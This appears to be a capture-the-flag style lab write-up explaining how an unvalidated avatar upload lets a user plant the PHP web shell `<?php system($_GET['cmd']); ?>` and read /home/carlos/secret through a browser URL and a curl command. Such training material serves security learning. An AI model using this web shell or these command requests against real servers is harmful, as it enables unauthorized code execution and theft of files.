# Remote code execution via web shell upload

### Goal - 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`

### Analysis/Exploitation -

Login as user `wiener`:

**In the lab’s background, it said:**

> This lab contains a vulnerable image upload function. It doesn’t perform any validation on the files users upload before storing them on the server’s filesystem.

Now, If the application doesn’t do any validation on user’s file upload, an attack could upload a web shell to the web server’s filesystem!

**But before we do that, let’s upload a normal file, and intercept the request via Burp Suite:**

When we clicked the `Upload` button, a POST request will be sent to `/my-account/avatar`, with parameters `name='user'`& `name='csrf'` at end after image data.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/198510e0-dccb-4a69-84aa-c4636e8207cf/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466435X54Q6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204706Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID5dUiwWx5thJYyFKhsnnn4JYd5GbPDlJzvtVZQwX2YCAiA5nZ%2BfgjgFem0LPiYdO1SorFYzF07PS5V8QN8vvBs2JCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMApBbMAJvrDMFX1IGKtwD6h3mAdsgi0J35ElDOuKt5JIJiL0nQI7a16hjY5Spbgf91IFf3MSd5cFgq7XmrPpTAn1Bh1sHyGidVA796tqG5%2FmhxB%2F5BihXBuEictxyt%2BKhxkIu9Zl3Tt3cfDq4HkAyGkqhisK4zcQ2SzxzvcemG7zpyKjTq91%2BxHRS%2FUuyx4uS8c%2F2SJf4vyazyh4DUYAj32iY0rKz%2BRoAyP6Q6M0NSGZYH%2Fl9DNePy15UOzkEHBLiVJE%2BOwUeVgXlWyDf67EFIaQtW95Sg9gr88yCUMkMgtcRYlTp%2FVEaVw0JN2R5ksmoEya%2B3rfT0Z7o4FwzN4lPdcL36FkLHF%2Fqqyz9z5cSyTyQ6C1Aj5X4lrAMlBYMV1l4e54HzlnRQgpm4HwcIrbSKykXAswaSJhtkTkUyTx7GyJh%2BZKZwJWbeGGf8DKYFvjT5Gj8NUCJKQXIauEg2OHInwIXnO3Z2%2F6TXxbLrId3JuMC3%2BYKNA2ZkHOI6Zv2iMWujYgC3fmZWqjgAKxrK1ujcON5e2jGAAgz0krI9OvypJ6PWxfP83Q513IOdi7ycbS6BSyq09S2l9eFTW9BXTQuK2p%2Bxli5vFDNzSNDbkAgXb9uac56U1pBNydny5kflHruJ8p87fiHsaxkFH0w78Wi1AY6pgHP4lPwXX1T0PhiByye0ws6DhvdobAxbih13yE57XKO0sMfXVqym0lURzNJVkewbZaB%2Fjuy65%2FWjS7g3YaWavzFpDPPzZoBC6%2FSF8opwr%2FVtQYEg%2Fq8GXrOjLRQKIMrEah8wG84CS31fUZ10YWjGZePdMbj4ut3fsVeGFAuScVkDGSjsDjdgynIGJwwMRR0Tx4vLX0gaf4aH%2B411eTfNAatYoPl5r6J&X-Amz-Signature=fbd006eca0d3a426e7a8468aeae1b2e92304fd8100b12c4b0478e03e036697ed&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

when we click “Back to My Account”, notice that image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cde8a822-35f5-47fc-9b42-f886f39b12b4/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466435X54Q6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204706Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID5dUiwWx5thJYyFKhsnnn4JYd5GbPDlJzvtVZQwX2YCAiA5nZ%2BfgjgFem0LPiYdO1SorFYzF07PS5V8QN8vvBs2JCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMApBbMAJvrDMFX1IGKtwD6h3mAdsgi0J35ElDOuKt5JIJiL0nQI7a16hjY5Spbgf91IFf3MSd5cFgq7XmrPpTAn1Bh1sHyGidVA796tqG5%2FmhxB%2F5BihXBuEictxyt%2BKhxkIu9Zl3Tt3cfDq4HkAyGkqhisK4zcQ2SzxzvcemG7zpyKjTq91%2BxHRS%2FUuyx4uS8c%2F2SJf4vyazyh4DUYAj32iY0rKz%2BRoAyP6Q6M0NSGZYH%2Fl9DNePy15UOzkEHBLiVJE%2BOwUeVgXlWyDf67EFIaQtW95Sg9gr88yCUMkMgtcRYlTp%2FVEaVw0JN2R5ksmoEya%2B3rfT0Z7o4FwzN4lPdcL36FkLHF%2Fqqyz9z5cSyTyQ6C1Aj5X4lrAMlBYMV1l4e54HzlnRQgpm4HwcIrbSKykXAswaSJhtkTkUyTx7GyJh%2BZKZwJWbeGGf8DKYFvjT5Gj8NUCJKQXIauEg2OHInwIXnO3Z2%2F6TXxbLrId3JuMC3%2BYKNA2ZkHOI6Zv2iMWujYgC3fmZWqjgAKxrK1ujcON5e2jGAAgz0krI9OvypJ6PWxfP83Q513IOdi7ycbS6BSyq09S2l9eFTW9BXTQuK2p%2Bxli5vFDNzSNDbkAgXb9uac56U1pBNydny5kflHruJ8p87fiHsaxkFH0w78Wi1AY6pgHP4lPwXX1T0PhiByye0ws6DhvdobAxbih13yE57XKO0sMfXVqym0lURzNJVkewbZaB%2Fjuy65%2FWjS7g3YaWavzFpDPPzZoBC6%2FSF8opwr%2FVtQYEg%2Fq8GXrOjLRQKIMrEah8wG84CS31fUZ10YWjGZePdMbj4ut3fsVeGFAuScVkDGSjsDjdgynIGJwwMRR0Tx4vLX0gaf4aH%2B411eTfNAatYoPl5r6J&X-Amz-Signature=a3a6bec5dc7aa53e0653332472d0c2f68a1cdf6858decb12c432cc28c11d3ace&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/05c4efad-f9bd-4978-bd13-a5d5925b051b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466435X54Q6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204706Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID5dUiwWx5thJYyFKhsnnn4JYd5GbPDlJzvtVZQwX2YCAiA5nZ%2BfgjgFem0LPiYdO1SorFYzF07PS5V8QN8vvBs2JCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMApBbMAJvrDMFX1IGKtwD6h3mAdsgi0J35ElDOuKt5JIJiL0nQI7a16hjY5Spbgf91IFf3MSd5cFgq7XmrPpTAn1Bh1sHyGidVA796tqG5%2FmhxB%2F5BihXBuEictxyt%2BKhxkIu9Zl3Tt3cfDq4HkAyGkqhisK4zcQ2SzxzvcemG7zpyKjTq91%2BxHRS%2FUuyx4uS8c%2F2SJf4vyazyh4DUYAj32iY0rKz%2BRoAyP6Q6M0NSGZYH%2Fl9DNePy15UOzkEHBLiVJE%2BOwUeVgXlWyDf67EFIaQtW95Sg9gr88yCUMkMgtcRYlTp%2FVEaVw0JN2R5ksmoEya%2B3rfT0Z7o4FwzN4lPdcL36FkLHF%2Fqqyz9z5cSyTyQ6C1Aj5X4lrAMlBYMV1l4e54HzlnRQgpm4HwcIrbSKykXAswaSJhtkTkUyTx7GyJh%2BZKZwJWbeGGf8DKYFvjT5Gj8NUCJKQXIauEg2OHInwIXnO3Z2%2F6TXxbLrId3JuMC3%2BYKNA2ZkHOI6Zv2iMWujYgC3fmZWqjgAKxrK1ujcON5e2jGAAgz0krI9OvypJ6PWxfP83Q513IOdi7ycbS6BSyq09S2l9eFTW9BXTQuK2p%2Bxli5vFDNzSNDbkAgXb9uac56U1pBNydny5kflHruJ8p87fiHsaxkFH0w78Wi1AY6pgHP4lPwXX1T0PhiByye0ws6DhvdobAxbih13yE57XKO0sMfXVqym0lURzNJVkewbZaB%2Fjuy65%2FWjS7g3YaWavzFpDPPzZoBC6%2FSF8opwr%2FVtQYEg%2Fq8GXrOjLRQKIMrEah8wG84CS31fUZ10YWjGZePdMbj4ut3fsVeGFAuScVkDGSjsDjdgynIGJwwMRR0Tx4vLX0gaf4aH%2B411eTfNAatYoPl5r6J&X-Amz-Signature=788381242285b748ea26b4cbdaf37f71f0ef80a16919114240d71f612554d6c4&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Now we know **the exact location of the uploaded file: **`/files/avatars/test.png`**.**

Try to upload PHP web shell

**Payload:**`<?php system($_GET['cmd']); ?>`

> 💡 **<?php system($_GET['cmd']); ?>**
$**_GET** Can collect data that was sent in the URL or submitted in an HTML form.
The command to be executed is obtained from the user's input via the $_GET superglobal array. In this case, the user is expected to pass the command as a query parameter named 'cmd' in the URL.

For example, if the script is hosted at example.com/shell.php, a user could execute a command by visiting:
**http://example.com/shell.php?cmd=ls%20-l**

Use the avatar upload function to upload malicious PHP file

Calling the file will output the content of the secret file:

```text
https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php/?cmd=cat%20/home/carlos/secret
```


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/fa72d605-48e2-4df2-b706-c8dbcaacd18d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466435X54Q6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204706Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID5dUiwWx5thJYyFKhsnnn4JYd5GbPDlJzvtVZQwX2YCAiA5nZ%2BfgjgFem0LPiYdO1SorFYzF07PS5V8QN8vvBs2JCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMApBbMAJvrDMFX1IGKtwD6h3mAdsgi0J35ElDOuKt5JIJiL0nQI7a16hjY5Spbgf91IFf3MSd5cFgq7XmrPpTAn1Bh1sHyGidVA796tqG5%2FmhxB%2F5BihXBuEictxyt%2BKhxkIu9Zl3Tt3cfDq4HkAyGkqhisK4zcQ2SzxzvcemG7zpyKjTq91%2BxHRS%2FUuyx4uS8c%2F2SJf4vyazyh4DUYAj32iY0rKz%2BRoAyP6Q6M0NSGZYH%2Fl9DNePy15UOzkEHBLiVJE%2BOwUeVgXlWyDf67EFIaQtW95Sg9gr88yCUMkMgtcRYlTp%2FVEaVw0JN2R5ksmoEya%2B3rfT0Z7o4FwzN4lPdcL36FkLHF%2Fqqyz9z5cSyTyQ6C1Aj5X4lrAMlBYMV1l4e54HzlnRQgpm4HwcIrbSKykXAswaSJhtkTkUyTx7GyJh%2BZKZwJWbeGGf8DKYFvjT5Gj8NUCJKQXIauEg2OHInwIXnO3Z2%2F6TXxbLrId3JuMC3%2BYKNA2ZkHOI6Zv2iMWujYgC3fmZWqjgAKxrK1ujcON5e2jGAAgz0krI9OvypJ6PWxfP83Q513IOdi7ycbS6BSyq09S2l9eFTW9BXTQuK2p%2Bxli5vFDNzSNDbkAgXb9uac56U1pBNydny5kflHruJ8p87fiHsaxkFH0w78Wi1AY6pgHP4lPwXX1T0PhiByye0ws6DhvdobAxbih13yE57XKO0sMfXVqym0lURzNJVkewbZaB%2Fjuy65%2FWjS7g3YaWavzFpDPPzZoBC6%2FSF8opwr%2FVtQYEg%2Fq8GXrOjLRQKIMrEah8wG84CS31fUZ10YWjGZePdMbj4ut3fsVeGFAuScVkDGSjsDjdgynIGJwwMRR0Tx4vLX0gaf4aH%2B411eTfNAatYoPl5r6J&X-Amz-Signature=794828b3d9baa9ac9276944f7f70d28dc27fb35dd140784e8cb803b9c8ea2655&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

via command line using curl

```bash
curl https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/47af05bc-20ed-4450-980e-c8b7d176fdda/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466435X54Q6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204706Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID5dUiwWx5thJYyFKhsnnn4JYd5GbPDlJzvtVZQwX2YCAiA5nZ%2BfgjgFem0LPiYdO1SorFYzF07PS5V8QN8vvBs2JCqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMApBbMAJvrDMFX1IGKtwD6h3mAdsgi0J35ElDOuKt5JIJiL0nQI7a16hjY5Spbgf91IFf3MSd5cFgq7XmrPpTAn1Bh1sHyGidVA796tqG5%2FmhxB%2F5BihXBuEictxyt%2BKhxkIu9Zl3Tt3cfDq4HkAyGkqhisK4zcQ2SzxzvcemG7zpyKjTq91%2BxHRS%2FUuyx4uS8c%2F2SJf4vyazyh4DUYAj32iY0rKz%2BRoAyP6Q6M0NSGZYH%2Fl9DNePy15UOzkEHBLiVJE%2BOwUeVgXlWyDf67EFIaQtW95Sg9gr88yCUMkMgtcRYlTp%2FVEaVw0JN2R5ksmoEya%2B3rfT0Z7o4FwzN4lPdcL36FkLHF%2Fqqyz9z5cSyTyQ6C1Aj5X4lrAMlBYMV1l4e54HzlnRQgpm4HwcIrbSKykXAswaSJhtkTkUyTx7GyJh%2BZKZwJWbeGGf8DKYFvjT5Gj8NUCJKQXIauEg2OHInwIXnO3Z2%2F6TXxbLrId3JuMC3%2BYKNA2ZkHOI6Zv2iMWujYgC3fmZWqjgAKxrK1ujcON5e2jGAAgz0krI9OvypJ6PWxfP83Q513IOdi7ycbS6BSyq09S2l9eFTW9BXTQuK2p%2Bxli5vFDNzSNDbkAgXb9uac56U1pBNydny5kflHruJ8p87fiHsaxkFH0w78Wi1AY6pgHP4lPwXX1T0PhiByye0ws6DhvdobAxbih13yE57XKO0sMfXVqym0lURzNJVkewbZaB%2Fjuy65%2FWjS7g3YaWavzFpDPPzZoBC6%2FSF8opwr%2FVtQYEg%2Fq8GXrOjLRQKIMrEah8wG84CS31fUZ10YWjGZePdMbj4ut3fsVeGFAuScVkDGSjsDjdgynIGJwwMRR0Tx4vLX0gaf4aH%2B411eTfNAatYoPl5r6J&X-Amz-Signature=9eedc0317b28776fca43fa22e807f8f9a0818847635cfeee61fb3150ccaabc2d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

